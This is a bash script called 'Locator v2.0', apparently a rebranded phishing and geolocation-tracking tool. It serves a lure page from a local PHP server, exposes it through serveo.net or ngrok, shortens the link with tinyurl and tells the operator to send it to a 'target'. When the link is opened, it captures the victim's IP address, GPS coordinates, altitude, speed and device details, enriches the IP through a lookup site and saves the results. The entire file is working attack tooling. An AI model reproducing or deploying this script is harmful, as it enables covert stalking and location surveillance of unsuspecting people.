#!/bin/bash
# Locator v2.0
# MeGans by: ⊱XͭPͪLͤᗝIƬ༻₁₀₀ᵏ (Skill Low)
# Github: https://github.com/TheSploit/Locate_Track

trap 'printf "\n";stop;exit 1' 2


dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }



command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}


stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi



}




catch_cred() {

longitude=$(grep -o 'Longitude:.*' server/geolocate.txt | cut -d " " -f2 | tr -d ' ')
IFS=$'\n'
latitude=$(grep -o 'Latitude:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
altitude=$(grep -o 'Altitude:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
accuracy=$(grep -o 'Accuracy:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
hardware=$(grep -o 'Cores:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
speed=$(grep -o 'Speed:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
platform=$(grep -o 'Platform:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
heading=$(grep -o 'Heading:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
memory=$(grep -o 'Memory:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
useragent=$(grep -o 'User-Agent:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
height=$(grep -o 'Screen Height:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
width=$(grep -o 'Screen Width:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m:::\e[0m\e[1;92m]\e[0m\e[1;93m Geolocation:\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Latitude:\e[0m\e[1;77m %s\n\e[0m" $latitude
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Longitude:\e[0m\e[1;77m %s\n\e[0m" $longitude
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Altitude:\e[0m\e[1;77m %s\n\e[0m" $altitude
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Speed:\e[0m\e[1;77m %s\n\e[0m" $speed
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Heading:\e[0m\e[1;77m %s\n\e[0m" $heading
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Accuracy:\e[0m\e[1;77m %sm\n\e[0m" $accuracy
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Map:\e[0m\e[1;77m https://www.google.com/maps/place/%s+%s\n\e[0m" $latitude $longitude
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m:::\e[0m\e[1;92m]\e[0m\e[1;93m Device Info:\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Platform:\e[0m\e[1;77m %s\n\e[0m" $platform
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Cores:\e[0m\e[1;77m %s\n\e[0m" $hardware
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m User-Agent:\e[0m\e[1;77m %s\n\e[0m" $useragent
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Memory:\e[0m\e[1;77m %s\n\e[0m" $memory
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Resolution:\e[0m\e[1;77m %sx%s\n\e[0m" $height $width
cat server/geolocate.txt >> server/saved.geolocate.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m server/saved.geolocate.txt\e[0m\n" 
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
exit 1

}

getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Geolocation ...\e[0m\n"
while [ true ]; do


if [[ -e "server/geolocate.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Geolocation Found!\n"
catch_cred

fi
sleep 0.5
if [[ -e "server/error.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Error on Geolocation!\n"
checkerror=$(grep -o 'Error:.*' server/error.txt | cut -d " " -f2 | tr -d ' ' )
if [[ $checkerror == 1 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User Denied Geolocation ...\e[0m\n"

rm -rf server/error.txt
getcredentials
elif [[ $checkerror == 2 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Geolocation Unavailable ...\e[0m\n"

rm -rf server/error.txt
getcredentials
elif [[ $checkerror == 3 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Time Out ...\e[0m\n"

rm -rf server/error.txt
getcredentials
elif [[ $checkerror == 4 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Unknow Error ...\e[0m\n"

rm -rf server/error.txt
getcredentials
else
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Error reading file error.txt...\e[0m\n"
exit 1
fi
fi
sleep 0.5



done 


}

catch_ip() {
touch server/saved.geolocate.txt
ip=$(grep -a 'IP:' server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Target IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m server/saved.ip.txt\e[0m\n"
cat server/ip.txt >> server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}

##
serverx() {
printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
php -t "server/" -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 4 # &
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
checkfound


}

startx() {
if [[ -e server/ip.txt ]]; then
rm -rf server/ip.txt

fi
if [[ -e server/geolocate.txt ]]; then
rm -rf server/geolocate.txt

fi

if [[ -e server/error.txt ]]; then
rm -rf server/error.txt

fi

default_port="55333" #$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m 55333 \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
serverx

}


##

start() {
if [[ -e server/ip.txt ]]; then
rm -rf server/ip.txt

fi
if [[ -e server/geolocate.txt ]]; then
rm -rf server/geolocate.txt

fi

if [[ -e server/error.txt ]]; then
rm -rf server/error.txt

fi
if [[ -e ngrok ]]; then
echo ""
else

printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi



else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
php -t "server/" -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
checkfound
}

start1() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunelling, Best!)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == 1 || $option_server == 01 ]]; then
startx

elif [[ $option_server == 2 || $option_server == 02 ]]; then
start
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}
checkfound() {

printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting target open the link ...\e[0m\n"
while [ true ]; do


if [[ -e "server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip

fi
sleep 1
done 

}

banner() {

printf "\e[1;93m  _                                                \e[0m\n"
printf "\e[1;93m (_)                             \e[0m\e[1;77m_                 \e[0m\n"
printf "\e[1;77m  _        ___    ____  _____  _| |_  ___    ____  \e[0m\n"
printf "\e[1;77m | |      / _ \  / ___)(____ |(_   _)/ _ \  / ___) \e[0m\n"
printf "\e[1;77m | |_____| |_| |( (___ / ___ |  | |_| |_| || |     \e[0m\n"
printf "\e[1;77m |_______)\___/  \____)\_____|   \__)\___/ |_|    v1.1 \e[0m\n"
printf "\n"
printf "\e[1;93m :::\e[0m\e[1;77m GANS by: @⊱XͭPͪLͤᗝIƬ༻₁₀₀ᵏ\e[0m\n"

}
banner
dependencies
start1

